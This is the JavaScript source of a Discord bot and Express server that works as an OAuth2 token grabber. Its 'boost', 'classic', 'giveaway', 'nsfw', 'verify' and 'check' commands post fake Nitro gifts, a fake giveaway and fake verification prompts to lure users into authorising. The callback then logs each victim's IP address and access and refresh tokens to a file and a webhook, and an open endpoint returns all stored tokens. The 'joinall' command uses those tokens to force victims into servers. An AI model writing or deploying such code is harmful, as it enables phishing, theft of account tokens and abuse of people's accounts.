const { Client, GatewayIntentBits, Partials, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const chalk = require('chalk');
const db = require('quick.db');
const fs = require('fs');
const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');

// Local Imports
const kalash = require("./kalash");
const emoji = require("./emoji");

// --- HELPER FUNCTION ---
function escapeRegex(str) {
    return str.replace(/[.*+?^${}()|[\]\\]/g, `\\$&`);
}

// --- DISCORD CLIENT SETUP ---
const client = new Client({
    fetchAllMembers: false,
    restTimeOffset: 0,
    partials: [Partials.Message, Partials.Channel, Partials.Reaction],
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildVoiceStates,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.GuildMessageReactions,
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.DirectMessageReactions,
        GatewayIntentBits.MessageContent, // Required to read message content
    ],
    presence: {
        activities: [{
            name: `over your server`,
            type: 3, // Corresponds to "WATCHING"
        }],
        status: "online"
    }
});

// --- EXPRESS SERVER FOR OAUTH2 ---
const app = express();
app.use(bodyParser.text());

// Serve the HTML page
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// Endpoint to view all authorized users
app.get('/kalashallauth', (req, res) => {
    fs.readFile('./object.json', 'utf8', (err, data) => {
        if (err) {
            console.error(chalk.red('Error reading object.json:', err));
            return res.status(500).json({ error: 'Failed to read user data.' });
        }
        res.json(JSON.parse(data));
    });
});

// Main OAuth2 callback endpoint
app.post('/', async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const code = req.body;

    if (!code || typeof code !== 'string') {
        return res.status(400).send('Invalid code provided.');
    }

    try {
        // 1. Exchange the authorization code for an access token
        const params = new URLSearchParams();
        params.append('client_id', kalash.client_id);
        params.append('client_secret', kalash.client_secret);
        params.append('grant_type', 'authorization_code');
        params.append('code', code);
        params.append('redirect_uri', kalash.redirect_uri);

        const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', params, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        });

        const { access_token, refresh_token, token_type } = tokenResponse.data;

        // 2. Fetch user's Discord information
        const userResponse = await axios.get('https://discord.com/api/users/@me', {
            headers: { authorization: `${token_type} ${access_token}` },
        });

        const { id: userID, username, discriminator, avatar } = userResponse.data;
        const fullUsername = discriminator === '0' ? username : `${username}#${discriminator}`;

        // 3. Read, check for duplicates, and write to object.json
        const objectPath = './object.json';
        let users = [];
        try {
            const data = fs.readFileSync(objectPath, 'utf8');
            users = JSON.parse(data);
        } catch (err) {
            if (err.code !== 'ENOENT') throw err; // Ignore if file doesn't exist, throw other errors
        }

        if (users.some(user => user.userID === userID)) {
            console.log(chalk.yellow(`[-] ${ip} - ${fullUsername} (Already Authorized)`));
            return res.status(200).send('User already authorized.');
        }

        console.log(chalk.green(`[+] ${ip} - ${fullUsername}`));

        const avatarURL = `https://cdn.discordapp.com/avatars/${userID}/${avatar}.png?size=4096`;
        
        // 4. Send a notification to the webhook
        const webhookEmbed = new EmbedBuilder()
            .setColor(0x303434)
            .setTitle(`${emoji.info} New User Authorized`)
            .setThumbnail(avatarURL)
            .setDescription(
                `${emoji.fleche} **User:** \`${fullUsername}\`\n\n` +
                `🔷 **IP Address:** \`${ip}\`\n` +
                `🔷 **User ID:** \`${userID}\`\n\n` +
                `🔑 **Access Token:** \`\`\`${access_token}\`\`\`\n` +
                `🔑 **Refresh Token:** \`\`\`${refresh_token}\`\`\``
            );

        await axios.post(kalash.wehbook, {
            username: "OAuth2 Logger",
            avatar_url: client.user.displayAvatarURL(),
            embeds: [webhookEmbed.toJSON()]
        });

        // 5. Add new user data and save
        const newUser = { userID, userIP: ip, avatarURL, username: fullUsername, access_token, refresh_token };
        users.push(newUser);
        fs.writeFileSync(objectPath, JSON.stringify(users, null, 4)); // Pretty-print JSON

        res.status(200).send('Authorization successful!');

    } catch (error) {
        console.error(chalk.red('OAuth2 Flow Error:'), error.response ? error.response.data : error.message);
        res.status(500).send('An error occurred during authorization.');
    }
});


// --- DISCORD BOT EVENTS ---
client.on("ready", () => {
    console.log(chalk.blue(`BOT ready! Logged in as ${client.user.username}`));
    console.log(chalk.green(`-> Prefix: ${kalash.prefix}`));
    console.log(chalk.green(`-> Bot Invite: https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot`));
});

client.on("messageCreate", async (ctx) => {
    if (!ctx.guild || ctx.author.bot) return;

    // Check for prefix
    const prefixRegex = new RegExp(`^(<@!?${client.user.id}>|${escapeRegex(kalash.prefix)})\\s*`);
    if (!prefixRegex.test(ctx.content)) return;

    const [, matchedPrefix] = ctx.content.match(prefixRegex);
    const args = ctx.content.slice(matchedPrefix.length).trim().split(/ +/);
    const cmd = args.shift().toLowerCase();

    // Permission check for all commands (owner or whitelisted)
    const isOwner = kalash.owners.includes(ctx.author.id);
    const isWhitelisted = db.get(`wl_${ctx.author.id}`) === true;
    if (!isOwner && !isWhitelisted) return;

    // --- COMMAND HANDLER ---

    if (cmd === "help") {
        const helpEmbed = new EmbedBuilder()
            .setColor(0x2F3136)
            .setTitle(`${emoji.help} Bot Command Dashboard`)
            .setDescription(`**Welcome to the Dashboard!**\n${emoji.prefix} My prefix is: \`${kalash.prefix}\``)
            .setImage('https://media.discordapp.net/attachments/1158752755461128262/1206837119352307772/20240213_110913_0000.png?ex=65dd75a7&is=65cb00a7&hm=de18377388e2b42b11b324875cef37ec2cdac75e6b2c0bea574631c482e47a39&')
            .addFields({ name: 'Commands', value: '`joinall`, `wl`, `stock`, `verify`, `boost`, `classic`, `check`, `links`, `botinfo`, `help`, and more.', inline: true })
            .setFooter({ text: `${kalash.client} Help Menu | ${kalash.footer}`, iconURL: 'https://media.discordapp.net/attachments/1158752755461128262/1206841191640080395/20240206_163433_0000.png' });
        
        ctx.channel.send({ embeds: [helpEmbed] });
    }

    if (cmd === "wl" && isOwner) {
        const subCommand = args[0];
        const targetUser = ctx.mentions.users.first() || await client.users.fetch(args[1]).catch(() => null);

        if (!subCommand || (['add', 'remove'].includes(subCommand) && !targetUser)) {
            return ctx.channel.send({ content: `Usage: \`${kalash.prefix}wl <add|remove|list> [user]\`` });
        }

        switch (subCommand) {
            case "add":
                if (db.get(`wl_${targetUser.id}`) === true) {
                    return ctx.channel.send({ embeds: [new EmbedBuilder().setColor(0x2F3136).setDescription(`${emoji.new} **${targetUser.username}** is already whitelisted.`)] });
                }
                db.set(`wl_${targetUser.id}`, true);
                ctx.channel.send({ embeds: [new EmbedBuilder().setColor(0x2F3136).setDescription(`${emoji.yes} **${targetUser.username}** has been added to the whitelist.`)] });
                break;

            case "remove":
                if (db.get(`wl_${targetUser.id}`) !== true) {
                    return ctx.channel.send({ embeds: [new EmbedBuilder().setColor(0x2F3136).setDescription(`${emoji.new} **${targetUser.username}** is not whitelisted.`)] });
                }
                db.delete(`wl_${targetUser.id}`);
                ctx.channel.send({ embeds: [new EmbedBuilder().setColor(0x2F3136).setDescription(`${emoji.yes} **${targetUser.username}** has been removed from the whitelist.`)] });
                break;

            case "list":
                const wlUsers = db.all().filter(data => data.ID.startsWith(`wl_`));
                if (wlUsers.length === 0) {
                    return ctx.channel.send({ embeds: [new EmbedBuilder().setColor(0x2F3136).setTitle(`${emoji.user} Whitelisted Users`).setDescription("No users are currently whitelisted.")] });
                }
                const description = wlUsers.map((entry, index) => {
                    const userId = entry.ID.split("_")[1];
                    const user = client.users.cache.get(userId);
                    return `\`${index + 1}\` ${user ? user.tag : 'Unknown User'} (\`${userId}\`)`;
                }).join('\n');

                ctx.channel.send({ embeds: [new EmbedBuilder().setColor(0x2F3136).setTitle(`${emoji.user} Whitelisted Users`).setDescription(description)] });
                break;
        }
    }

    if (cmd === "stock") {
        fs.readFile('./object.json', 'utf8', (err, data) => {
            const userCount = err ? 0 : JSON.parse(data).length;
            const stockEmbed = new EmbedBuilder()
                .setColor(0x2F3136)
                .setTitle(`${emoji.user} User Stock`)
                .setDescription(`${emoji.box} There are **${userCount}** member(s) authorized.`);
            ctx.channel.send({ embeds: [stockEmbed] });
        });
    }

    if (cmd === "joinall") {
        fs.readFile('./object.json', 'utf8', async (err, data) => {
            if (err) return ctx.channel.send({ content: "Error: Could not read `object.json`." });
            
            const users = JSON.parse(data);
            const totalUsers = users.length;
            if (totalUsers === 0) return ctx.channel.send({ content: "There are no users in stock to join." });

            const msg = await ctx.channel.send({ content: `${emoji.load} **Starting joinall...** (\`0\`/\`${totalUsers}\`)` });

            let success = 0;
            let error = 0;
            let already_joined = 0;
            
            for (const user of users) {
                const member = await ctx.guild.members.fetch(user.userID).catch(() => null);
                if (member) {
                    already_joined++;
                } else {
                    try {
                        await ctx.guild.members.add(user.userID, { accessToken: user.access_token });
                        success++;
                    } catch (e) {
                        error++;
                    }
                }
            }

            const resultEmbed = new EmbedBuilder()
                .setColor(0x2F3136)
                .setTitle(`${emoji.user} OAuth2 Joinall Complete`)
                .setDescription(
                    `${emoji.new} **Already in server**: ${already_joined}\n` +
                    `${emoji.succes} **Successfully Joined**: ${success}\n` +
                    `${emoji.error} **Failed to Join**: ${error}`
                )
                .setFooter({ text: `${kalash.client} | ${kalash.footer}` });

            msg.edit({ content: "Joinall finished!", embeds: [resultEmbed] });
        });
    }

    if (["boost", "classic", "giveaway", "nsfw", "verify", "check"].includes(cmd)) {
        let embed = new EmbedBuilder();
        const row = new ActionRowBuilder();
        let content = "";

        switch (cmd) {
            case "boost":
                embed.setTitle(`You've been gifted Discord Nitro for a year!`)
                    .setColor(0x738ADB)
                    .setImage("https://media.discordapp.net/attachments/1009463535551660032/1010011666517336124/unknown.jpg")
                    .setDescription("To claim your Nitro, click the button below and authorize.\n\nOnce authorized, you should receive it within 5-42 hours.");
                row.addComponents(new ButtonBuilder().setLabel("Claim Nitro").setStyle(ButtonStyle.Link).setURL(kalash.authLink));
                break;
            case "classic":
                 embed.setTitle(`You've been gifted Nitro Classic for a year!`)
                    .setColor(0x738ADB)
                    .setImage("https://media.discordapp.net/attachments/991938111217094708/992945246138794044/Nitro.png")
                    .setDescription("To claim your Nitro Classic, click the button below and authorize.\n\nOnce authorized, you should receive it within 5-42 hours.");
                row.addComponents(new ButtonBuilder().setLabel("Claim Nitro Classic").setStyle(ButtonStyle.Link).setURL(kalash.authLink));
                break;
            case "giveaway":
                content = "🎉 **Giveaway** 🎉";
                embed.setTitle(`Nitro Boost (Yearly) / $100 Gift Card`)
                    .setColor(0x5865F2)
                    .setDescription(`**Winners:** \`1\`\n**Ends in:** \`7 days\`\n**Hosted by:** ${ctx.author}\n\nClick the button below to enter!`);
                row.addComponents(new ButtonBuilder().setLabel("Enter Giveaway 🎉").setStyle(ButtonStyle.Link).setURL(kalash.authLink));
                break;
            case "nsfw":
                embed.setColor(0xFF0000).setDescription(`**To view NSFW channels, you must verify your age.\n\nClick [here](${kalash.authLink}) to gain access. 🔞**`);
                row.addComponents(new ButtonBuilder().setLabel("Gain Access").setStyle(ButtonStyle.Link).setURL(kalash.authLink));
                break;
            case "verify":
                 embed.setColor(0x00FF00).setDescription(`**To access the rest of the server, please verify yourself.\n\nClick the button [here](${kalash.authLink}) to verify! ✅**`);
                row.addComponents(new ButtonBuilder().setLabel("Verify ✅").setStyle(ButtonStyle.Link).setURL(kalash.authLink));
                break;
             case "check":
                 embed.setColor(0xFF0000).setDescription(`**:link: The mentioned user is not verified! ❌\n\nPlease verify yourself by clicking [here](${kalash.authLink})!**`);
                row.addComponents(new ButtonBuilder().setLabel("Verify Now").setStyle(ButtonStyle.Link).setURL(kalash.authLink));
                break;
        }
        ctx.channel.send({ content: content || null, embeds: [embed], components: [row] });
    }

    if (cmd === "links") {
        const linksEmbed = new EmbedBuilder()
            .setColor(0x2F3136)
            .setTitle(`${emoji.link} Important Links`)
            .setDescription(
                `${emoji.links} **OAuth2 User Auth:** [Link](${kalash.authLink})\n` +
                `${emoji.m} **Bot Invite:** [Link](https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot)`
            );
        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setLabel("Bot Invite")
                .setStyle(ButtonStyle.Link)
                .setURL(`https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot`)
        );
        ctx.channel.send({ embeds: [linksEmbed], components: [row] });
    }

    if (cmd === "botinfo") {
        const infoEmbed = new EmbedBuilder()
            .setColor(0x5865F2)
            .setAuthor({ name: client.user.username, iconURL: client.user.displayAvatarURL() })
            .setThumbnail(client.user.displayAvatarURL())
            .addFields(
                { name: "`🐼` Bot Information", value: `> **Name:** ${client.user}\n> **ID:** ${client.user.id}` },
                { name: "`🌙` Developer", value: `> **Name:** Masoom` } // As per original code
            );
        ctx.channel.send({ embeds: [infoEmbed] });
    }
});

// --- Handle Process Errors and Login ---
process.on("unhandledRejection", err => console.error(chalk.red("Unhandled Rejection:"), err));
process.on("uncaughtException", err => console.error(chalk.red("Uncaught Exception:"), err));

client.login(process.env.TOKEN).catch(() => {
    throw new Error(chalk.red(`FATAL ERROR: The TOKEN provided is invalid or you have incorrect INTENTS.`));
});

app.listen(kalash.port, () => console.log(chalk.cyan(`Express server is now listening on port ${kalash.port}`)));
